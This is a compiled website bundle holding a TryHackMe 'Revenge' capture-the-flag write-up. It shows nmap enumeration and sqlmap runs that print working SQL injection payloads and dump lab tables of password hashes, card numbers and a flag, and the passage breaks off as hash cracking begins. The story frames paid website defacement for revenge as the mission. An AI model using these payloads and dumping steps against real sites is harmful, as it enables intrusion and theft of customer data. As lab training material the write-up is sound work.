"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[1963],{3905:(e,n,t)=>{t.d(n,{Zo:()=>d,kt:()=>h});var r=t(67294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function s(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var l=r.createContext({}),c=function(e){var n=r.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):s(s({},n),e)),t},d=function(e){var n=c(e.components);return r.createElement(l.Provider,{value:n},e.children)},u="mdxType",p={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},m=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,o=e.originalType,l=e.parentName,d=i(e,["components","mdxType","originalType","parentName"]),u=c(t),m=a,h=u["".concat(l,".").concat(m)]||u[m]||p[m]||o;return t?r.createElement(h,s(s({ref:n},d),{},{components:t})):r.createElement(h,s({ref:n},d))}));function h(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var o=t.length,s=new Array(o);s[0]=m;var i={};for(var l in n)hasOwnProperty.call(n,l)&&(i[l]=n[l]);i.originalType=e,i[u]="string"==typeof e?e:a,s[1]=i;for(var c=2;c<o;c++)s[c]=t[c];return r.createElement.apply(null,s)}return r.createElement.apply(null,t)}m.displayName="MDXCreateElement"},31354:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>s,default:()=>p,frontMatter:()=>o,metadata:()=>i,toc:()=>c});var r=t(87462),a=(t(67294),t(3905));const o={},s="Revenge",i={unversionedId:"Tryhackme/Revenge/Revenge",id:"Tryhackme/Revenge/Revenge",title:"Revenge",description:"You've been hired by Billy Joel to get revenge on Ducky Inc...the company that fired him. Can you break into the server and complete your mission?",source:"@site/writeups/Tryhackme/Revenge/Revenge.md",sourceDirName:"Tryhackme/Revenge",slug:"/Tryhackme/Revenge/",permalink:"/writeups/Tryhackme/Revenge/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Retro",permalink:"/writeups/Tryhackme/Retro/"},next:{title:"Reverse Engineering",permalink:"/writeups/Tryhackme/Reverse Engineering/"}},l={},c=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Message from Billy Joel",id:"task-1-message-from-billy-joel",level:2},{value:"Task 2 Revenge!",id:"task-2-revenge",level:2}],d={toc:c},u="wrapper";function p(e){let{components:n,...t}=e;return(0,a.kt)(u,(0,r.Z)({},d,t,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"revenge"},"Revenge"),(0,a.kt)("p",null,"You've been hired by Billy Joel to get revenge on Ducky Inc...the company that fired him. Can you break into the server and complete your mission?"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/revenge"},"Revenge")),(0,a.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,a.kt)("li",{parentName:"ul"},"SQL Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Brute Forcing (Hash)"),(0,a.kt)("li",{parentName:"ul"},"Misconfigured Binaries")),(0,a.kt)("hr",null),(0,a.kt)("h2",{id:"task-1-message-from-billy-joel"},"Task 1 Message from Billy Joel"),(0,a.kt)("p",null,"Billy Joel has sent you a message regarding your mission. Download it, read it and continue on."),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"Read through your mission and continue")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Revenge$ cat qTyAhRp.txt\nTo whom it may concern,\n\nI know it was you who hacked my blog.  I was really impressed with your skills.  You were a little sloppy\nand left a bit of a footprint so I was able to track you down.  But, thank you for taking me up on my offer.\nI've done some initial enumeration of the site because I know *some* things about hacking but not enough.\nFor that reason, I'll let you do your own enumeration and checking.\n\nWhat I want you to do is simple.  Break into the server that's running the website and deface the front page.\nI don't care how you do it, just do it.  But remember...DO NOT BRING DOWN THE SITE!  We don't want to cause irreparable damage.\n\nWhen you finish the job, you'll get the rest of your payment.  We agreed upon $5,000.\nHalf up-front and half when you finish.\n\nGood luck,\n\nBilly\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,a.kt)("h2",{id:"task-2-revenge"},"Task 2 Revenge!"),(0,a.kt)("p",null,"This is revenge! You've been hired by Billy Joel to break into and deface the ",(0,a.kt)("strong",{parentName:"p"},"Rubber Ducky Inc"),". webpage. He was fired for probably good reasons but who cares, you're just here for the money. Can you fulfill your end of the bargain?"),(0,a.kt)("p",null,(0,a.kt)("em",{parentName:"p"},"There is a sister room to this one. If you have not completed ",(0,a.kt)("a",{parentName:"em",href:"https://tryhackme.com/room/blog"},"Blog")," yet, I recommend you do so. It's not required but may enhance the story for you.")),(0,a.kt)("p",null,(0,a.kt)("em",{parentName:"p"},"All images on the webapp, including the navbar brand logo, 404 and 500 pages, and product images goes to ",(0,a.kt)("a",{parentName:"em",href:"https://tryhackme.com/p/Varg"},"Varg"),". Thanks for helping me out with this one, bud.")),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"Please hack responsibly. Do not attack a website or domain that you do not own the rights to. TryHackMe does not condone illegal hacking. This room is just for fun and to tell a story.")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Revenge$ sudo nmap -A -sS -sC -sV -O 10.10.232.228\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 21:57 CEST\nNmap scan report for 10.10.232.228\nHost is up (0.044s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 72:53:b7:7a:eb:ab:22:70:1c:f7:3c:7a:c7:76:d9:89 (RSA)\n|   256 43:77:00:fb:da:42:02:58:52:12:7d:cd:4e:52:4f:c3 (ECDSA)\n|_  256 2b:57:13:7c:c8:4f:1d:c2:68:67:28:3f:8e:39:30:ab (ED25519)\n80/tcp open  http    nginx 1.14.0 (Ubuntu)\n|_http-server-header: nginx/1.14.0 (Ubuntu)\n|_http-title: Home | Rubber Ducky Inc.\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/18%OT=22%CT=1%CU=39393%PV=Y%DS=2%DC=T%G=Y%TM=5F8C9E\nOS:47%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC\nOS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT      ADDRESS\n1   36.21 ms 10.8.0.1\n2   46.97 ms 10.10.232.228\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 25.40 seconds\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://10.10.232.228/products/99"},"http://10.10.232.228/products/99")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Revenge$ sqlmap --current-db -u http://10.10.232.228/products/1\n        ___\n       __H__\n ___ ___[.]_____ ___ ___  {1.4.9#stable}\n|_ -| . [,]     | .'| . |\n|___|_  [(]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 22:00:42 /2020-10-18/\n\n[22:00:42] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'\ndo you want to try URI injections in the target URL itself? [Y/n/q]\n[22:00:47] [INFO] testing connection to the target URL\n[22:00:48] [INFO] checking if the target is protected by some kind of WAF/IPS\n[22:00:48] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS\nare you sure that you want to continue with further target testing? [Y/n]\n[22:00:50] [WARNING] please consider usage of tamper scripts (option '--tamper')\n[22:00:50] [INFO] testing if the target URL content is stable\n[22:00:50] [INFO] target URL content is stable\n[22:00:50] [INFO] testing if URI parameter '#1*' is dynamic\n[22:00:50] [WARNING] URI parameter '#1*' does not appear to be dynamic\n[22:00:51] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable\n[22:00:51] [INFO] testing for SQL injection on URI parameter '#1*'\n[22:00:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[22:00:53] [INFO] URI parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)\n[22:00:55] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'\nit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]\nfor the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]\n[22:01:22] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'\n[22:01:22] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'\n[22:01:22] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'\n[22:01:23] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'\n[22:01:23] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'\n[22:01:23] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'\n[22:01:23] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'\n[22:01:23] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'\n[22:01:23] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'\n[22:01:23] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'\n[22:01:23] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'\n[22:01:23] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'\n[22:01:23] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'\n[22:01:24] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'\n[22:01:24] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'\n[22:01:24] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'\n[22:01:24] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'\n[22:01:24] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'\n[22:01:24] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'\n[22:01:24] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'\n[22:01:24] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'\n[22:01:24] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'\n[22:01:25] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'\n[22:01:25] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'\n[22:01:25] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'\n[22:01:25] [INFO] testing 'Generic inline queries'\n[22:01:25] [INFO] testing 'MySQL inline queries'\n[22:01:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'\n[22:01:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries'\n[22:01:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'\n[22:01:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'\n[22:01:26] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'\n[22:01:26] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'\n[22:01:26] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'\n[22:01:36] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable\n[22:01:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'\n[22:01:36] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found\n[22:01:36] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test\n[22:01:36] [INFO] target URL appears to have 8 columns in query\ndo you want to (re)try to find proper UNION column types with fuzzy test? [y/N]\ninjection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n]\n[22:01:46] [INFO] URI parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable\nURI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N]\nsqlmap identified the following injection point(s) with a total of 119 HTTP(s) requests:\n---\nParameter: #1* (URI)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: http://10.10.232.228:80/products/1 AND 8138=8138\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: http://10.10.232.228:80/products/1 AND (SELECT 2437 FROM (SELECT(SLEEP(5)))afyQ)\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 8 columns\n    Payload: http://10.10.232.228:80/products/-2625 UNION ALL SELECT 88,CONCAT(0x71787a6b71,0x5a766c585777594e444d596c55786e71626a68676c7255716b696d6b70575348705741616779504d,0x71766a7171),88,88,88,88,88,88-- -\n---\n[22:01:48] [INFO] the back-end DBMS is MySQL\nback-end DBMS: MySQL >= 5.0.12\n[22:01:49] [INFO] fetching current database\ncurrent database: 'duckyinc'\n[22:01:49] [WARNING] HTTP error codes detected during run:\n405 (Method Not Allowed) - 1 times, 500 (Internal Server Error) - 80 times\n[22:01:49] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.232.228'\n\n[*] ending @ 22:01:49 /2020-10-18/\n\nkali@kali:~/CTFs/tryhackme/Revenge$ sqlmap -D duckyinc --dump -u http://10.10.232.228/products/1\n        ___\n       __H__\n ___ ___[,]_____ ___ ___  {1.4.9#stable}\n|_ -| . [)]     | .'| . |\n|___|_  [\"]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 22:01:58 /2020-10-18/\n\n[22:01:58] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'\ndo you want to try URI injections in the target URL itself? [Y/n/q]\n[22:01:59] [INFO] resuming back-end DBMS 'mysql'\n[22:01:59] [INFO] testing connection to the target URL\n[22:02:00] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: #1* (URI)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: http://10.10.232.228:80/products/1 AND 8138=8138\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: http://10.10.232.228:80/products/1 AND (SELECT 2437 FROM (SELECT(SLEEP(5)))afyQ)\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 8 columns\n    Payload: http://10.10.232.228:80/products/-2625 UNION ALL SELECT 88,CONCAT(0x71787a6b71,0x5a766c585777594e444d596c55786e71626a68676c7255716b696d6b70575348705741616779504d,0x71766a7171),88,88,88,88,88,88-- -\n---\n[22:02:00] [INFO] the back-end DBMS is MySQL\nback-end DBMS: MySQL >= 5.0.12\n[22:02:00] [INFO] fetching tables for database: 'duckyinc'\n[22:02:01] [INFO] retrieved: 'product'\n[22:02:01] [INFO] retrieved: 'system_user'\n[22:02:01] [INFO] retrieved: 'user'\n[22:02:01] [INFO] fetching columns for table 'user' in database 'duckyinc'\n[22:02:02] [INFO] retrieved: 'id','int(11)'\n[22:02:03] [INFO] retrieved: 'username','varchar(64)'\n[22:02:03] [INFO] retrieved: '_password','varchar(128)'\n[22:02:03] [INFO] retrieved: 'credit_card','varchar(26)'\n[22:02:03] [INFO] retrieved: 'email','varchar(120)'\n[22:02:03] [INFO] retrieved: 'company','varchar(50)'\n[22:02:03] [INFO] fetching entries for table 'user' in database 'duckyinc'\n[22:02:04] [INFO] retrieved: '$2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa','Fake Inc','4338736490565706','sales@fakeinc.org','1','jhenry'\n[22:02:04] [INFO] retrieved: '$2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm','Evil Corp','355219744086163','accountspayable@ecorp.org','2','smonroe'\n[22:02:04] [INFO] retrieved: '$2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C','McDoonalds Inc','349789518019219','accounts.payable@mcdoonalds.org','3','dross'\n[22:02:04] [INFO] retrieved: '$2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO','ABC Corp','4499108649937274','sales@ABC.com','4','ngross'\n[22:02:04] [INFO] retrieved: '$2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu','Three Below','4563593127115348','sales@threebelow.com','5','jlawlor'\n[22:02:04] [INFO] retrieved: '$2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC','Krasco Org','thm{br3ak1ng_4nd_3nt3r1ng}','ap@krasco.org','6','mandrews'\n[22:02:04] [INFO] retrieved: '$2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm','Wally World Corp','4905698211632780','payable@wallyworld.com','7','dgorman'\n[22:02:04] [INFO] retrieved: '$2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS','Orlando City','4690248976187759','payables@orlando.gov','8','mbutts'\n[22:02:05] [INFO] retrieved: '$2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem','Dolla Twee','375019041714434','sales@dollatwee.com','9','hmontana'\n[22:02:05] [INFO] retrieved: '$2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36','O!  Fam Dollar','364774395134471','sales@ofamdollar','10','csmith'\nDatabase: duckyinc\nTable: user\n[10 entries]\n+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+\n| id | email                           | company          | username | _password                                                    | credit_card                |\n+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+\n| 1  | sales@fakeinc.org               | Fake Inc         | jhenry   | $2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa | 4338736490565706           |\n| 2  | accountspayable@ecorp.org       | Evil Corp        | smonroe  | $2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm | 355219744086163            |\n| 3  | accounts.payable@mcdoonalds.org | McDoonalds Inc   | dross    | $2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C | 349789518019219            |\n| 4  | sales@ABC.com                   | ABC Corp         | ngross   | $2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO | 4499108649937274           |\n| 5  | sales@threebelow.com            | Three Below      | jlawlor  | $2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu | 4563593127115348           |\n| 6  | ap@krasco.org                   | Krasco Org       | mandrews | $2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC | thm{br3ak1ng_4nd_3nt3r1ng} |\n| 7  | payable@wallyworld.com          | Wally World Corp | dgorman  | $2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm | 4905698211632780           |\n| 8  | payables@orlando.gov            | Orlando City     | mbutts   | $2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS | 4690248976187759           |\n| 9  | sales@dollatwee.com             | Dolla Twee       | hmontana | $2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem | 375019041714434            |\n| 10 | sales@ofamdollar                | O!  Fam Dollar   | csmith   | $2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36 | 364774395134471            |\n+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+\n\n[22:02:05] [INFO] table 'duckyinc.`user`' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.232.228/dump/duckyinc/user.csv'\n[22:02:05] [INFO] fetching columns for table 'product' in database 'duckyinc'\n[22:02:05] [INFO] retrieved: 'id','int(11)'\n[22:02:05] [INFO] retrieved: 'name','varchar(64)'\n[22:02:05] [INFO] retrieved: 'price','decimal(10,2)'\n[22:02:05] [INFO] retrieved: 'cost','decimal(10,2)'\n[22:02:05] [INFO] retrieved: 'image_url','varchar(64)'\n[22:02:06] [INFO] retrieved: 'color_options','varchar(64)'\n[22:02:06] [INFO] retrieved: 'in_stock','varchar(1)'\n[22:02:06] [INFO] retrieved: 'details','varchar(360)'\n[22:02:06] [INFO] fetching entries for table 'product' in database 'duckyinc'\n[22:02:06] [INFO] retrieved: 'yellow','50.00','Individual boxes of duckies! Boxes are sold only in the yellow color. This item is eligible for FAST shipping from one of our local warehouses....\n[22:02:06] [INFO] retrieved: 'yellow, blue, green, red','500.00','Do you love a dozen donuts? Then you'll love a dozen boxes of duckies! This item is not eligible for FAST shipping. However,...\n[22:02:06] [INFO] retrieved: 'yellow, blue, red, orange','800.00','Got lots of shelves to fill? Customers that want their duckies? Look no further than the pallet of duckies! This baby comes...\n[22:02:06] [INFO] retrieved: 'yellow, blue','15000.00','This is it! Our largest order of duckies! You mean business with this order. You must have a ducky emporium if you need this many duck...\nDatabase: duckyinc\nTable: product\n[4 entries]\n+----+----------+-----------------------+----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+\n| id | cost     | name                  | price    | details                                                                                                                                                                                                                                                                                                                 | in_stock | image_url                         | color_options             |\n+----+----------+-----------------------+----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+\n| 1  | 50.00    | Box of Duckies        | 35.00    | Individual boxes of duckies! Boxes are sold only in the yellow color. This item is eligible for FAST shipping from one of our local warehouses. If you order before 2 PM on any weekday, we can guarantee that your order will be shipped out the same day.                                                             | Y        | images/box-of-duckies.png         | yellow                    |\n| 2  | 500.00   | Dozen of Duckies      | 600.00   | Do you love a dozen donuts? Then you'll love a dozen boxes of duckies! This item is not eligible for FAST shipping. However, orders of this product are typically shipped out next day, provided they are ordered prior to 2 PM on any weekday.                                                                         | N        | images/dozen-boxes-of-duckies.png | yellow, blue, green, red  |\n| 3  | 800.00   | Pallet of Duckies     | 1000.00  | Got lots of shelves to fill? Customers that want their duckies? Look no further than the pallet of duckies! This baby comes with 20 boxes of duckies in the colors of your choosing. Boxes can only contain one color ducky but multiple colors can be selected when you call to order. Just let your salesperson know. | N        | images/pallet.png                 | yellow, blue, red, orange |\n| 4  | 15000.00 | Truck Load of Duckies | 22000.00 | This is it! Our largest order of duckies! You mean business with this order. You must have a ducky emporium if you need this many duckies. Due to the logistics with this type of order, FAST shipping is not available.\\r\\n\\r\\nActual truck not pictured.                                                              | Y        | images/truckload.png              | yellow, blue              |\n+----+----------+-----------------------+----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+\n\n[22:02:06] [INFO] table 'duckyinc.product' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.232.228/dump/duckyinc/product.csv'\n[22:02:06] [INFO] fetching columns for table 'system_user' in database 'duckyinc'\n[22:02:07] [INFO] retrieved: 'id','int(11)'\n[22:02:07] [INFO] retrieved: 'username','varchar(64)'\n[22:02:07] [INFO] retrieved: '_password','varchar(128)'\n[22:02:07] [INFO] retrieved: 'email','varchar(120)'\n[22:02:07] [INFO] fetching entries for table 'system_user' in database 'duckyinc'\n[22:02:07] [INFO] retrieved: '$2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a','sadmin@duckyinc.org','1','server-admin'\n[22:02:07] [INFO] retrieved: '$2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa','kmotley@duckyinc.org','2','kmotley'\n[22:02:07] [INFO] retrieved: '$2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK','dhughes@duckyinc.org','3','dhughes'\nDatabase: duckyinc\nTable: system_user\n[3 entries]\n+----+----------------------+--------------+--------------------------------------------------------------+\n| id | email                | username     | _password                                                    |\n+----+----------------------+--------------+--------------------------------------------------------------+\n| 1  | sadmin@duckyinc.org  | server-admin | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |\n| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |\n| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |\n+----+----------------------+--------------+--------------------------------------------------------------+\n\n[22:02:07] [INFO] table 'duckyinc.`system_user`' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.232.228/dump/duckyinc/system_user.csv'\n[22:02:07] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.232.228'\n\n[*] ending @ 22:02:07 /2020-10-18/\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Revenge$ john server-admin.hash 